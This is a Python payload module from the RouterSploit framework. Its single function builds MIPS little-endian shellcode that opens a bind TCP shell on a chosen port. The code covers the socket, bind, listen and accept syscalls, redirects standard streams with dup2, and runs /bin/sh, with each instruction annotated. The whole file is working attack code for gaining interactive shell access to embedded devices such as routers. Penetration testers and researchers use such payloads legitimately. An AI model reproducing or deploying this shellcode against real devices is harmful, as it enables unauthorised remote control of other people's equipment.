from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    BindTCPPayloadMixin,
)


class Payload(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "MIPSLE Bind TCP",
        "description": "Creates interactive tcp bind shell for MIPSLE architecture.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.MIPSLE

    def generate(self):
        bind_port = utils.convert_port(self.rport)

        return (
            b"\xe0\xff\xbd\x27" +  # addiu   sp,sp,-32
            b"\xfd\xff\x0e\x24" +  # li      t6,-3
            b"\x27\x20\xc0\x01" +  # nor     a0,t6,zero
            b"\x27\x28\xc0\x01" +  # nor     a1,t6,zero
            b"\xff\xff\x06\x28" +  # slti    a2,zero,-1
            b"\x57\x10\x02\x24" +  # li      v0,4183 ( __NR_socket )
            b"\x0c\x01\x01\x01" +  # syscall

            b"\xff\xff\x50\x30" +  # andi    s0,v0,0xffff
            b"\xef\xff\x0e\x24" +  # li      t6,-17                        ; t6: 0xffffffef
            b"\x27\x70\xc0\x01" +  # nor     t6,t6,zero                    ; t6: 0x10 (16)
            bind_port + b"\x0d\x24" +  # li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 4444 (default LPORT))
            b"\x04\x68\xcd\x01" +  # sllv    t5,t5,t6                      ; t5: 0x5c110000
            b"\xfd\xff\x0e\x24" +  # li      t6,-3                         ; t6: -3
            b"\x27\x70\xc0\x01" +  # nor     t6,t6,zero                    ; t6: 0x2
            b"\x25\x68\xae\x01" +  # or      t5,t5,t6                      ; t5: 0x5c110002
            b"\xe0\xff\xad\xaf" +  # sw      t5,-32(sp)
            b"\xe4\xff\xa0\xaf" +  # sw      zero,-28(sp)
            b"\xe8\xff\xa0\xaf" +  # sw      zero,-24(sp)
            b"\xec\xff\xa0\xaf" +  # sw      zero,-20(sp)
            b"\x25\x20\x10\x02" +  # or      a0,s0,s0
            b"\xef\xff\x0e\x24" +  # li      t6,-17
            b"\x27\x30\xc0\x01" +  # nor     a2,t6,zero
            b"\xe0\xff\xa5\x23" +  # addi    a1,sp,-32
            b"\x49\x10\x02\x24" +  # li      v0,4169 ( __NR_bind )A
            b"\x0c\x01\x01\x01" +  # syscall

            b"\x25\x20\x10\x02" +  # or      a0,s0,s0
            b"\x01\x01\x05\x24" +  # li      a1,257
            b"\x4e\x10\x02\x24" +  # li      v0,4174 ( __NR_listen )
            b"\x0c\x01\x01\x01" +  # syscall

            b"\x25\x20\x10\x02" +  # or      a0,s0,s0
            b"\xff\xff\x05\x28" +  # slti    a1,zero,-1
            b"\xff\xff\x06\x28" +  # slti    a2,zero,-1
            b"\x48\x10\x02\x24" +  # li      v0,4168 ( __NR_accept )
            b"\x0c\x01\x01\x01" +  # syscall

            b"\xff\xff\xa2\xaf" +  # sw v0,-1(sp) # socket
            b"\xfd\xff\x11\x24" +  # li s1,-3
            b"\x27\x88\x20\x02" +  # nor s1,s1,zero
            b"\xff\xff\xa4\x8f" +  # lw a0,-1(sp)
            b"\x21\x28\x20\x02" +  # move a1,s1 # dup2_loop
            b"\xdf\x0f\x02\x24" +  # li v0,4063 ( __NR_dup2 )
            b"\x0c\x01\x01\x01" +  # syscall 0x40404
            b"\xff\xff\x10\x24" +  # li s0,-1
            b"\xff\xff\x31\x22" +  # addi s1,s1,-1
            b"\xfa\xff\x30\x16" +  # bne s1,s0 <dup2_loop>

            b"\xff\xff\x06\x28" +  # slti a2,zero,-1
            b"\x62\x69\x0f\x3c" +  # lui t7,0x2f2f "bi"
            b"\x2f\x2f\xef\x35" +  # ori t7,t7,0x6269 "//"
            b"\xec\xff\xaf\xaf" +  # sw t7,-20(sp)
            b"\x73\x68\x0e\x3c" +  # lui t6,0x6e2f "sh"
            b"\x6e\x2f\xce\x35" +  # ori t6,t6,0x7368 "n/"
            b"\xf0\xff\xae\xaf" +  # sw t6,-16(sp)
            b"\xf4\xff\xa0\xaf" +  # sw zero,-12(sp)
            b"\xec\xff\xa4\x27" +  # addiu a0,sp,-20
            b"\xf8\xff\xa4\xaf" +  # sw a0,-8(sp)
            b"\xfc\xff\xa0\xaf" +  # sw zero,-4(sp)
            b"\xf8\xff\xa5\x27" +  # addiu a1,sp,-8
            b"\xab\x0f\x02\x24" +  # li v0,4011 ( __NR_execve )
            b"\x0c\x01\x01\x01"  # syscall 0x40404
        )
